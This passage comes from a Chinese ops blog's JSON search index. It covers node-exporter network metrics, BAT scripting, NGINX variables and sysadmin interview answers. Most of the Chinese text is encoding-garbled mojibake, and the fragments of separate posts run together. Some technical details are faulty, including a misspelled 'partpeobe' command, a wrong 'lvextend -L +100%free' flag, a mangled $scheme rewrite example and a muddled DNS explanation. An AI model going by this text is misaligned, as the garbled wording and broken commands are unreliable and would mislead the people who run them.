æŠ¥æ–‡æ•° æ¥æ”¶çš„ SYN cookies çš„æ•°é‡ node_netstat_TcpExt_SyncookiesSent counter æŠ¥æ–‡æ•° å‘é€çš„ SYN cookies çš„æ•°é‡ node_sockstat_TCP_alloc Graph æŠ¥æ–‡æ•° å·²åˆ†é…ï¼ˆå·²å»ºç«‹ã€å·²ç”³è¯·åˆ°sk_buffï¼‰çš„TCPå¥—æ¥å­—æ•°é‡ node_sockstat_TCP_inuse Graph æŠ¥æ–‡æ•° æ­£åœ¨ä½¿ç”¨ï¼ˆæ­£åœ¨ä¾¦å¬ï¼‰çš„TCPå¥—æ¥å­—æ•°é‡ node_sockstat_TCP_mem Graph æŠ¥æ–‡æ•° TCP å¥—æ¥å­—ç¼“å†²åŒºä½¿ç”¨é‡ node_sockstat_TCP_orphan Graph æŠ¥æ–‡æ•° æ— ä¸»ï¼ˆä¸å±äºä»»ä½•è¿›ç¨‹ï¼‰çš„TCPè¿æ¥æ•°ï¼ˆæ— ç”¨ã€å¾…é”€æ¯çš„TCP socketæ•°ï¼‰ node_sockstat_TCP_tw Graph æŠ¥æ–‡æ•° ç­‰å¾…å…³é—­çš„TCPè¿æ¥æ•° node_sockstat_TCP_mem_bytes Graph bytes TCP å¥—æ¥å­—ç¼“å†²åŒºæ¯”ç‰¹æ•° UDP ç›¸å…³æŒ‡æ ‡ åç§° ç±»å‹ å•ä½ è¯´æ˜ node_sockstat_UDPLITE_inuse Graph æŠ¥æ–‡æ•° æ­£åœ¨ä½¿ç”¨çš„ UDP-Lite å¥—æ¥å­—æ•°é‡ node_sockstat_UDP_inuse Graph æŠ¥æ–‡æ•° æ­£åœ¨ä½¿ç”¨çš„ UDP å¥—æ¥å­—æ•°é‡ node_sockstat_UDP_mem Graph æŠ¥æ–‡æ•° UDP å¥—æ¥å­—ç¼“å†²åŒºä½¿ç”¨é‡ node_sockstat_UDP_mem_bytes Graph bytes UDP å¥—æ¥å­—ç¼“å†²åŒºæ¯”ç‰¹æ•° node_netstat_Udp_InDatagrams Graph æŠ¥æ–‡æ•° æ¥æ”¶çš„ UDP æ•°æ®åŒ… node_netstat_Udp_OutDatagrams Graph æŠ¥æ–‡æ•° å‘é€çš„ UDP æ•°æ®åŒ… node_netstat_Udp_InErrors Graph æŠ¥æ–‡æ•° æœ¬æœºç«¯å£æœªç›‘å¬ä¹‹å¤–çš„å…¶ä»–åŸå› å¼•èµ·çš„ UDP å…¥åŒ…æ— æ³•é€è¾¾(åº”ç”¨å±‚)çš„æ•°é‡ node_netstat_Udp_NoPorts Graph æŠ¥æ–‡æ•° æœªçŸ¥ç«¯å£æ¥æ”¶ UDP æ•°æ®åŒ…çš„æ•°é‡ node_netstat_UdpLite_InErrors Graph æŠ¥æ–‡æ•° æœ¬æœºç«¯å£æœªç›‘å¬ä¹‹å¤–çš„å…¶ä»–åŸå› å¼•èµ·çš„ UDP-Lite å…¥åŒ…æ— æ³•é€è¾¾(åº”ç”¨å±‚)çš„æ•°é‡ UDPä¸UDP-liteçš„åŒºåˆ« ä¼ ç»Ÿçš„UDPåè®®æ˜¯å¯¹å…¶è½½è·ï¼ˆPayloadï¼‰è¿›è¡Œå®Œæ•´çš„æ ¡éªŒçš„ï¼Œå¦‚æœå…¶ä¸­çš„ä¸€äº›ä½ï¼ˆå“ªæ€•åªæœ‰ä¸€ä½ï¼‰å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆæ•´ä¸ªæ•°æ®åŒ…éƒ½æœ‰å¯èƒ½è¢«ä¸¢å¼ƒï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸¢æ‰è¿™ä¸ªåŒ…çš„ä»£ä»·æ˜¯éå¸¸å¤§çš„ï¼Œå°¤å…¶å½“åŒ…æ¯”è¾ƒå¤§çš„æ—¶å€™ã€‚åœ¨UDP-Liteåè®®ä¸­ï¼Œä¸€ä¸ªæ•°æ®åŒ…åˆ°åº•éœ€ä¸éœ€è¦å¯¹å…¶è½½è·è¿›è¡Œæ ¡éªŒï¼Œæˆ–è€…æ˜¯æ ¡éªŒå¤šå°‘ä½éƒ½æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ï¼ˆleemingæ³¨é‡Šï¼šè¿™æ˜¯è¿™ç§å¯é€‰æ‹©æ€§ï¼Œå…¶å®udp_liteçš„ä»£ç å®ç°æ˜¯æ¯”udp``å¤æ‚çš„ï¼Œthough å­—é¢ä¸Šæœ‰ä¸ªliteï¼‰ï¼Œå¹¶ä¸”UDP-Liteåè®®å°±æ˜¯ç”¨UDPåè®®çš„Lengthå­—æ®µæ¥è¡¨ç¤ºå…¶Checksum Coverageçš„ï¼Œæ‰€ä»¥å½“UDP-Liteåè®®çš„Checksum Coverageå­—æ®µç­‰äºæ•´ä¸ªUDPæ•°æ®åŒ…ï¼ˆåŒ…æ‹¬UDPå¤´å’Œè½½è·ï¼‰çš„é•¿åº¦æ—¶ï¼ŒUDP-Liteäº§ç”Ÿçš„åŒ…ä¹Ÿå°†å’Œä¼ ç»Ÿçš„UDPåŒ…ä¸€æ¨¡ä¸€æ ·ã€‚ ICMP Internet Control Message Protocolï¼ŒICMPæ˜¯ç½‘è·¯åè®®æ—çš„æ ¸å¿ƒåè®®ä¹‹ä¸€ã€‚å®ƒç”¨äºTCP/IPç½‘ç»œä¸­å‘é€æ§åˆ¶æ¶ˆæ¯ï¼Œæä¾›å¯èƒ½å‘ç”Ÿåœ¨é€šä¿¡ç¯å¢ƒä¸­çš„å„ç§é—®é¢˜åé¦ˆï¼Œé€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œä»¤ç®¡ç†è€…å¯ä»¥å¯¹æ‰€å‘ç”Ÿçš„é—®é¢˜ä½œå‡ºè¯Šæ–­ï¼Œç„¶åé‡‡å–é€‚å½“çš„æªæ–½è§£å†³ã€‚ ICMPé€šå¸¸ç”¨äºè¿”å›çš„é”™è¯¯ä¿¡æ¯æˆ–æ˜¯åˆ†æè·¯ç”±ã€‚ICMPé”™è¯¯æ¶ˆæ¯æ€»æ˜¯åŒ…æ‹¬äº†æºæ•°æ®å¹¶è¿”å›ç»™å‘é€è€…ã€‚ ICMPé”™è¯¯æ¶ˆæ¯çš„ä¾‹å­ä¹‹ä¸€æ˜¯TTLå€¼è¿‡æœŸã€‚æ¯ä¸ªè·¯ç”±å™¨åœ¨è½¬å‘æ•°æ®æŠ¥çš„æ—¶å€™éƒ½ä¼šæŠŠipåŒ…å¤´ä¸­çš„TTLå€¼å‡ä¸€ã€‚å¦‚æœTTLå€¼ä¸º0ï¼ŒTTLåœ¨ä¼ è¾“ä¸­è¿‡æœŸçš„æ¶ˆæ¯å°†ä¼šå›æŠ¥ç»™æºåœ°å€ã€‚ åç§° ç±»å‹ å•ä½ è¯´æ˜ node_netstat_Icmp_InErrors Graph æŠ¥æ–‡æ•° æ¥æ”¶çš„ ICMP é”™è¯¯çš„æŠ¥æ–‡ï¼ˆä¾‹å¦‚ICMPæ ¡éªŒå’Œé”™è¯¯ã€é•¿åº¦é”™è¯¯ç­‰ï¼‰ node_netstat_Icmp_InMsgs Graph æŠ¥æ–‡æ•° æ¥æ”¶çš„æŠ¥æ–‡æ•° node_netstat_Icmp_OutMsgs Graph æŠ¥æ–‡æ•° å‘é€çš„æŠ¥æ–‡æ•° Sockstat çš„å…¶ä»–æŒ‡æ ‡ åç§° ç±»å‹ å•ä½ è¯´æ˜ node_sockstat_sockets_used Graph æŠ¥æ–‡æ•° ä½¿ç”¨çš„æ‰€æœ‰åè®®å¥—æ¥å­—æ€»é‡ node_sockstat_FRAG_inuse Graph æŠ¥æ–‡æ•° æ­£åœ¨ä½¿ç”¨çš„ Frag å¥—æ¥å­—æ•°é‡ node_sockstat_FRAG_memory Graph æŠ¥æ–‡æ•° ä½¿ç”¨çš„ Frag ç¼“å†²åŒº node_sockstat_RAW_inuse Graph æŠ¥æ–‡æ•° æ­£åœ¨ä½¿ç”¨çš„ Raw å¥—æ¥å­—æ•°é‡ ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:0:0","tags":["linux","ç›‘æ§","prometheus","node-exporter"],"title":"node-exporter è¿æ¥æ•°ç›¸å…³æŒ‡æ ‡","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["windows","æ•´ç†æ”¶é›†"],"content":"å¸¸ç”¨çš„BATè„šæœ¬è¯­æ³•","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/","tags":["linux","windows","bat","è½¬å‘å†…å®¹"],"title":"å¸¸ç”¨çš„BATè„šæœ¬è¯­æ³•","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["windows","æ•´ç†æ”¶é›†"],"content":" æˆ‘ä»¬åœ¨æ—¥å¸¸å·¥ä½œä¸­å¸¸å¸¸ä¼šé‡åˆ°ä¸€äº›éœ€è¦é‡å¤è¿›è¡Œçš„å·¥ä½œï¼Œåˆæˆ–è€…æˆ‘ä»¬çš„é¡¹ç›®åœ¨è½¬äº¤å®¢æˆ·æ—¶éœ€è¦å»ç®€åŒ–é…ç½®è¿‡ç¨‹ è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨åˆ°ä¸€äº›è‡ªåŠ¨åŒ–éƒ¨ç½²æ“ä½œï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šé‡‡ç”¨è„šæœ¬æ¥å®Œæˆè¿™éƒ¨åˆ†åŠŸèƒ½ ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç»ä¸€ç§è„šæœ¬ç±»å‹Batè„šæœ¬ï¼Œæˆ‘ä»¬ä¼šä»ä»¥ä¸‹æ–¹é¢ä»‹ç»ï¼š è„šæœ¬ä»‹ç» Batè„šæœ¬åŸºæœ¬è¯­æ³• Batè„šæœ¬å¸¸ç”¨è¯­æ³• Batè„šæœ¬è¿›é˜¶å†…å®¹ å¼•ç”¨ https://www.cnblogs.com/qiuluoyuweiliang/p/17288356.html ","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/:0:0","tags":["linux","windows","bat","è½¬å‘å†…å®¹"],"title":"å¸¸ç”¨çš„BATè„šæœ¬è¯­æ³•","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"NGINXä¸­å˜é‡è¯¦è§£","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"NGINXä¸­å˜é‡è¯¦è§£","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" ä»¥ä¸‹ä¸ºèµ„æ–™æ¥æº,ç”±æœ¬ç«™æ”¶é›†é‡æ–°æ•´ç†å‘å¸ƒ,ä»…ç”¨äºä¸ªäººæ”¶è—,è½¬è½½è¯·ç›´æ¥æ ‡æ³¨ä»¥ä¸‹æ¥æºè¿æ¥ http://www.hangdaowangluo.com/archives/754 http Croeæ¨¡å— - - $http_user_agent å®¢æˆ·ç«¯UAä¿¡æ¯ $http_cookie å®¢æˆ·ç«¯COOKIE $cookie_name å‚è€ƒ$arg_nameçš„ç”¨æ³• $arg_name è·å–URIä¸­çš„GETå‚æ•°ï¼Œæ¯”æ–¹è¯´http://localhost:8080/test?class=3ï¼Œåˆ™ç”¨$arg_classè·å–ã€‚æ³¨ï¼š1ï¼‰ä¸åŒºåˆ†å¤§å°å†™ï¼Œä¾‹å¦‚CLASS=2åŒæ ·ä½¿ç”¨$arg_classè·å–ï¼›2ï¼‰å¦‚æœå‚æ•°escapeç¼–ç äº†ï¼Œä½¿ç”¨set_unescape_uri åç¼–ç ï¼Œä¾‹å¦‚ï¼š\u003cbr/\u003eset_unescape_uri $name $arg_name;\u003cbr/\u003eset_unescape_uri $class $arg_class;\u003cbr/\u003eecho â€œname: $nameâ€;\u003cbr/\u003eecho â€œclass: $classâ€ $args è·å–urlä¸­çš„GETå‚æ•°å­—ç¬¦ä¸²,www.129.com/?name=a1\u0026b=b1ï¼Œ$args=name=a1\u0026b=b1 $binary_remote_addr äºŒè¿›åˆ¶æ ¼å¼çš„å®¢æˆ·ç«¯åœ°å€ï¼Œä¾‹å¦‚\\xC0\\xA8P\\x81ï¼Œè¡¨ç¤ºä¸º192.168.80.1 $body_bytes_sent å“åº”ä½“çš„å¤§å°ï¼Œå³ä½¿å‘ç”Ÿäº†ä¸­æ–­æˆ–è€…æ˜¯æ”¾å¼ƒï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„å‡†ç¡®ã€‚ $bytes_sent number of bytes sent to a client $connection connection serial number $connection_requests current number of requests made through a connection $content_length è¯·æ±‚å¤´éƒ¨ä¿¡æ¯ä¸­çš„Content-Length $content_type è¯·æ±‚å¤´éƒ¨ä¿¡æ¯ä¸­çš„Content-Type $document_root å˜é‡çš„å€¼ä¸ºå½“å‰è¯·æ±‚çš„locationï¼ˆhttpï¼Œserverï¼Œlocationï¼Œlocationä¸­çš„ifï¼‰ä¸­rootæŒ‡ä»¤ä¸­æŒ‡å®šçš„å€¼ï¼Œæˆ–aliasçš„å€¼ $document_uri åŒ$uri $host è¯¥å˜é‡çš„å€¼ç­‰äºè¯·æ±‚å¤´ä¸­Hostçš„å€¼ã€‚å¦‚æœHostæ— æ•ˆæ—¶ï¼Œé‚£ä¹ˆå°±æ˜¯å¤„ç†è¯¥è¯·æ±‚çš„serverçš„åç§°ã€‚åœ¨ä¸‹åˆ—æƒ…å†µä¸­ï¼Œ$hostå˜é‡çš„å–å€¼ä¸åŒäº$http_hostå˜é‡ã€‚1) å½“è¯·æ±‚å¤´ä¸­çš„Hostå­—æ®µæœªæŒ‡å®šï¼ˆä½¿ç”¨é»˜è®¤å€¼ï¼‰æˆ–è€…ä¸ºç©ºå€¼ï¼Œé‚£ä¹ˆ$hostç­‰äºserver_nameæŒ‡ä»¤æŒ‡å®šçš„å€¼ã€‚2) å½“Hostå­—æ®µåŒ…å«ç«¯å£æ˜¯ï¼Œ$hostå¹¶ä¸åŒ…å«ç«¯å£å·ã€‚å¦å¤–ï¼Œä»0.8.17ä¹‹åçš„nginxä¸­ï¼Œ$hostçš„å€¼æ€»æ˜¯å°å†™ã€‚ $hostname æœ‰gethostnameè¿”å›å€¼è®¾ç½®æœºå™¨å $http_name è¯¥å˜é‡çš„å€¼ä¸ºHTTP è¯·æ±‚å¤´HEADERï¼Œå…·ä½“ä½¿ç”¨æ—¶ä¼šè½¬æ¢ä¸ºå°å†™ï¼Œå¹¶ä¸”å°†â€œâ€”â€”â€ï¼ˆç ´æŠ˜å·ï¼‰è½¬æ¢ä¸ºâ€œ_â€(ä¸‹åˆ’çº¿)ã€‚ä¾‹å¦‚$http_Connection $https â€œonâ€ if connection operates in SSL mode, or an empty string otherwise $is_args â€œ?â€ if a request line has arguments, or an empty string otherwise $limit_rate è¯¥å˜é‡å…è®¸é™åˆ¶è¿æ¥é€Ÿç‡ï¼Œå‚è€ƒ limit_rate $msec current time in seconds with the milliseconds resolution (1.3.9, 1.2.6) $nginx_version ç‰ˆæœ¬ $pid Pid $pipe â€œpâ€ if request was pipelined, â€œ.â€ otherwise (1.3.12, 1.2.7) $query_string åŒ$args $realpath_root an absolute pathname corresponding to the root or alias directiveâ€™s value for the current request, with all symbolic links resolved to real paths $remote_addr å®¢æˆ·ç«¯çš„IPåœ°å€ $remote_port å®¢æˆ·ç«¯è¿æ¥ç«¯å£ $remote_user å˜é‡ç­‰äºç”¨æˆ·çš„åå­—ï¼ŒåŸºæœ¬èº«ä»½éªŒè¯æ¨¡å—ä½¿ç”¨ $request full original request line $request_body è¯¥å˜é‡åŒ…å«äº†è¯·æ±‚ä½“çš„ä¸»è¦ä¿¡æ¯ã€‚è¯¥å˜é‡ä¸proxy_passæˆ–è€…fastcgi_passç›¸å…³ $request_body_file å®¢æˆ·ç«¯è¯·æ±‚ä½“çš„ä¸´æ—¶æ–‡ä»¶ $request_completion å¦‚æœè¯·æ±‚æˆåŠŸå®Œæˆï¼Œé‚£ä¹ˆæ˜¾ç¤ºâ€œOKâ€ã€‚å¦‚æœè¯·æ±‚æ²¡æœ‰å®Œæˆæˆ–è€…è¯·æ±‚ä¸æ˜¯è¯¥è¯·æ±‚ç³»åˆ—çš„æœ€åä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå®ƒçš„å€¼ä¸ºç©ºã€‚ $request_filename è¯¥å˜é‡ç­‰äºå½“å‰è¯·æ±‚æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ‰æŒ‡ä»¤rootæˆ–è€…aliaså’ŒURIæ„æˆ $request_id unique request identifier generated from 16 random bytes, in hexadecimal (1.11.0) $request_length request length (including request line, header, and request body) (1.3.12, 1.2.7) $request_method è¯¥å˜é‡çš„å€¼é€šå¸¸æ˜¯GETæˆ–è€…POSTã€‚ $request_time request processing time in seconds with a milliseconds resolution (1.3.9, 1.2.6); time elapsed since the first bytes were read from the client $request_uri è¯¥å˜é‡çš„å€¼ç­‰äºåŸå§‹çš„URIè¯·æ±‚ï¼Œå°±æ˜¯è¯´ä»å®¢æˆ·ç«¯æ”¶åˆ°çš„å‚æ•°åŒ…æ‹¬äº†åŸå§‹è¯·æ±‚çš„URIï¼Œè¯¥å€¼æ˜¯ä¸å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œä¸åŒ…å«ä¸»æœºåï¼Œä¾‹å¦‚â€œ/foo/bar.php?arg=bazâ€ã€‚ $scheme åŠŸèƒ½ï¼šè¯¥å˜é‡è¡¨ç¤ºHTTP schemeï¼ˆä¾‹å¦‚HTTPï¼ŒHTTPSï¼‰ï¼Œæ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µæ¥å†³å®šï¼Œä¾‹å¦‚ï¼šrewrite ^ scheme://example.comscheme://example.comscheme://example.comuri redirect; $sent_http_name arbitrary response header field; the last part of a variable name is the field name converted to lower case with dashes replaced by underscores $server_addr è¯¥å˜é‡çš„å€¼ç­‰äºæœåŠ¡å™¨çš„åœ°å€ã€‚é€šå¸¸æ¥è¯´ï¼Œåœ¨å®Œæˆä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ä¹‹åå°±ä¼šè·å–å˜é‡çš„å€¼ï¼Œä¸ºäº†é¿å¼€ç³»ç»Ÿé’“é±¼ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨listenæŒ‡ä»¤ä¸­ä½¿ç”¨bindå‚æ•°ã€‚ $server_name è¯¥å˜é‡ä¸ºserverçš„åå­—ã€‚ $server_port è¯¥å˜é‡ç­‰äºæ¥æ”¶è¯·æ±‚çš„ç«¯å£ $server_protocol è¯¥å˜é‡çš„å€¼ä¸ºè¯·æ±‚åè®®çš„å€¼ï¼Œé€šå¸¸æ˜¯HTTP/1.0æˆ–è€…HTTP/1.1 $status response status (1.3.2, 1.2.2) $tcpinfo_rtt, $tcpinfo_rttvar, $tcpinfo_snd_cwnd, $tcpinfo_rcv_space information about the client TCP connection; available on systems that support the TCP_INFO socket option $time_iso8601 local time in the ISO 8601 standard format (1.3.12, 1.2.7) $time_local local time in the Common Log Format (1.3.12, 1.2.7) $uri è¯¥å˜é‡çš„å€¼ç­‰äºå½“å‰è¯·æ±‚ä¸­çš„URIï¼ˆæ²¡æœ‰å‚æ•°ï¼Œä¸åŒ…æ‹¬$argsï¼‰çš„å€¼ã€‚å®ƒçš„å€¼ä¸åŒäºrequest_uriï¼Œç”±æµè§ˆå™¨å®¢æˆ·ç«¯å‘é€çš„request_uriçš„å€¼ã€‚ä¾‹å¦‚ï¼Œå¯èƒ½ä¼šè¢«å†…éƒ¨é‡å®šå‘æˆ–è€…ä½¿ç”¨indexã€‚å¦å¤–éœ€è¦æ³¨æ„ï¼š$uriä¸åŒ…å«ä¸»æœºåï¼Œä¾‹å¦‚ â€œ/foo/bar.htmlâ€å½“å‰åˆ¤æ–­URL= $scheme://$server_name/$uri ","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"NGINXä¸­å˜é‡è¯¦è§£","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"è¿ç»´å¸¸è§é¢è¯•é¢˜","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"è¿ç»´å¸¸è§é¢è¯•é¢˜","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" 1. è¯·ç®€è¿°OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹æœ‰å“ªäº›å±‚åŠå„è‡ªçš„å«ä¹‰ ç‰©ç†å±‚ï¼šåº•å±‚æ•°æ®ä¼ è¾“ï¼Œæ¯”å¦‚ç½‘çº¿ã€ç½‘å¡æ ‡å‡† æ•°æ®é“¾è·¯å±‚ï¼šå®šä¹‰æ•°æ®çš„åŸºæœ¬æ ¼å¼ï¼Œå¦‚ä½•ä¼ è¾“ï¼Œå¦‚ä½•æ ‡è¯†ã€‚æ¯”å¦‚ç½‘å¡MACåœ°å€ ç½‘ç»œå±‚ï¼šå®šä¹‰IPç¼–ç ï¼Œå®šä¹‰è·¯ç”±åŠŸèƒ½ï¼Œæ¯”å¦‚ä¸åŒè®¾å¤‡çš„æ•°æ®è½¬å‘ ä¼ è¾“å±‚ï¼šç«¯åˆ°ç«¯ä¼ è¾“æ•°æ®çš„åŸºæœ¬åŠŸèƒ½ï¼Œæ¯”å¦‚TCPã€UDP ä¼šè¯å±‚ï¼šæ§åˆ¶åº”ç”¨ç¨‹åºä¹‹é—´ä¼šè¯èƒ½åŠ›ï¼Œæ¯”å¦‚ä¸åŒè½¯ä»¶æ•°æ®åˆ†å‘ç»™ä¸åœè½¯ä»¶ è¡¨ç¤ºå±‚ï¼šæ•°æ®æ ¼å¼æ ‡è¯†ï¼ŒåŸºæœ¬å‹ç¼©åŠ å¯†åŠŸèƒ½ã€‚ åº”ç”¨å±‚ï¼šå„ç§åº”ç”¨è½¯ä»¶ï¼ŒåŒ…æ‹¬ Web åº”ç”¨ã€‚ 2. åœ¨Linuxçš„LVMåˆ†åŒºæ ¼å¼ä¸‹ï¼Œè¯·ç®€è¿°ç»™æ ¹åˆ†åŒºç£ç›˜æ‰©å®¹çš„æ­¥éª¤. è¿™ä¸ªåˆ†3ç§ ç¬¬ä¸€ç§æ–¹æ³•: growpart /dev/vda 1 resize2fs /dev/vda1 ç¬¬äºŒç§æ–¹æ³•: partpeobe /dev/sda resize2fs /dev/vda1 ç¬¬ä¸‰ç§æ–¹æ³•: fdisk /dev/sdb # n p 1 1 å›è½¦ å›è½¦ t 8e w pvcreate /dev/sdb1 vgextend datavg /dev/sdb1 lvextend -r -L +100%free /dev/mapper/datavg-lv01 3. è®²è¿°ä¸€ä¸‹Tomcat8005ã€8009ã€8080ä¸‰ä¸ªç«¯å£çš„å«ä¹‰ï¼Ÿ 8005ï¼šå…³é—­æ—¶ä½¿ç”¨ 8009ï¼šä¸ºAJPç«¯å£ï¼Œå³å®¹å™¨ä½¿ç”¨ï¼Œå¦‚Apacheèƒ½é€šè¿‡AJPåè®®è®¿é—®Tomcatçš„8009ç«¯å£æ¥å®ç°åŠŸèƒ½ 8080ï¼šä¸€èˆ¬åº”ç”¨ä½¿ç”¨ 4. ç®€è¿°DNSè¿›è¡ŒåŸŸåè§£æçš„è¿‡ç¨‹ï¼Ÿ è¿­ä»£æŸ¥è¯¢ï¼ˆè¿”å›æœ€ä¼˜ç»“æœï¼‰ã€é€’å½’æŸ¥è¯¢ï¼ˆæœ¬åœ°æ‰¾DNSï¼‰ç”¨æˆ·è¦è®¿é—® www.baidu.comï¼Œä¼šå…ˆæ‰¾æœ¬æœºçš„hostæ–‡ä»¶ï¼Œå†æ‰¾æœ¬åœ°è®¾ç½®çš„DNSæœåŠ¡å™¨ï¼Œå¦‚æœä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å»ç½‘ç»œä¸­æ‰¾æ ¹æœåŠ¡å™¨ï¼Œæ ¹æœåŠ¡å™¨åé¦ˆç»“æœï¼Œè¯´åªèƒ½æä¾›ä¸€çº§åŸŸåæœåŠ¡å™¨.cnï¼Œå°±å»æ‰¾ä¸€çº§åŸŸåæœåŠ¡å™¨ï¼Œä¸€çº§åŸŸåæœåŠ¡å™¨è¯´åªèƒ½æä¾›äºŒçº§åŸŸåæœåŠ¡å™¨.com.cn,å°±å»æ‰¾äºŒçº§åŸŸåæœåŠ¡å™¨ï¼ŒäºŒçº§åŸŸæœåŠ¡å™¨åªèƒ½æä¾›ä¸‰çº§åŸŸåæœåŠ¡å™¨.baidu.com.cnï¼Œå°±å»æ‰¾ä¸‰çº§åŸŸåæœåŠ¡å™¨ï¼Œä¸‰çº§åŸŸåæœåŠ¡å™¨æ­£å¥½æœ‰è¿™ä¸ªç½‘ç«™www.baidu.comï¼Œç„¶åå‘ç»™è¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¿å­˜ä¸€ä»½ä¹‹åï¼Œå†å‘ç»™å®¢æˆ·ç«¯ã€‚ 5. è®²ä¸€ä¸‹Keepalivedçš„å·¥ä½œåŸç†ï¼Ÿ åœ¨ä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ä¸­ï¼Œåªæœ‰ä½œä¸ºMASTERçš„VRRP(è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®)è·¯ç”±å™¨ä¼šä¸€ç›´å‘é€VRRPé€šå‘Šä¿¡æ¯ï¼ŒBACKUPä¸ä¼šæŠ¢å MASTERï¼Œé™¤éå®ƒçš„ä¼˜å…ˆçº§æ›´é«˜ã€‚å½“MASTERä¸å¯ç”¨æ—¶(BACKUPæ”¶ä¸åˆ°é€šå‘Šä¿¡æ¯)å¤šå°BACKUPä¸­ä¼˜å…ˆçº§æœ€é«˜çš„è¿™å°ä¼šè¢«æŠ¢å ä¸ºMASTERã€‚è¿™ç§æŠ¢å æ˜¯éå¸¸å¿«é€Ÿçš„(\u003c1s)ï¼Œä»¥ä¿è¯æœåŠ¡çš„è¿ç»­æ€§ç”±äºå®‰å…¨æ€§è€ƒè™‘ï¼ŒVRRPåŒ…ä½¿ç”¨äº†åŠ å¯†åè®®è¿›è¡ŒåŠ å¯†ã€‚BACKUPä¸ä¼šå‘é€é€šå‘Šä¿¡æ¯ï¼Œåªä¼šæ¥æ”¶é€šå‘Šä¿¡æ¯ã€‚ 6. LVSã€Nginxã€HAproxyæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå·¥ä½œä¸­ä½ æ€ä¹ˆé€‰æ‹©ï¼Ÿ LVSï¼š æŠ—è´Ÿè½½èƒ½åŠ›å¼ºã€å·¥ä½œåœ¨ç¬¬4å±‚ä»…ä½œåˆ†å‘ä¹‹ç”¨ï¼Œæ²¡æœ‰æµé‡çš„äº§ç”Ÿï¼Œè¿™ä¸ªç‰¹ç‚¹ä¹Ÿå†³å®šäº†å®ƒåœ¨è´Ÿè½½å‡è¡¡è½¯ä»¶é‡Œçš„æ€§èƒ½æœ€å¼ºçš„ï¼› æ— æµé‡ï¼ŒåŒæ—¶ä¿è¯äº†å‡è¡¡å™¨IOçš„æ€§èƒ½ä¸ä¼šå—åˆ°å¤§æµé‡çš„å½±å“ï¼› å·¥ä½œç¨³å®šï¼Œè‡ªèº«æœ‰å®Œæ•´çš„åŒæœºçƒ­å¤‡æ–¹æ¡ˆï¼Œå¦‚LVS+Keepalivedå’ŒLVS+Heartbeatï¼› åº”ç”¨èŒƒå›´æ¯”è¾ƒå¹¿ï¼Œå¯ä»¥å¯¹æ‰€æœ‰åº”ç”¨åšè´Ÿè½½å‡è¡¡ï¼› é…ç½®ç®€å•ï¼Œå› ä¸ºæ²¡æœ‰å¯å¤ªå¤šé…ç½®çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦å¤ªå¤šæ¥è§¦ï¼Œå¤§å¤§å‡å°‘äº†äººä¸ºå‡ºé”™çš„å‡ ç‡ï¼› LVSçš„ç¼ºç‚¹ï¼š è½¯ä»¶æœ¬èº«ä¸æ”¯æŒæ­£åˆ™å¤„ç†ï¼Œä¸èƒ½åšåŠ¨é™åˆ†ç¦»ï¼Œè¿™å°±å‡¸æ˜¾äº†Nginx/HAProxy+Keepalivedçš„ä¼˜åŠ¿ã€‚ å¦‚æœç½‘ç«™åº”ç”¨æ¯”è¾ƒåºå¤§ï¼ŒLVS/DR+Keepalivedå°±æ¯”è¾ƒå¤æ‚äº†ï¼Œç‰¹åˆ«æ˜¯åé¢æœ‰Windows 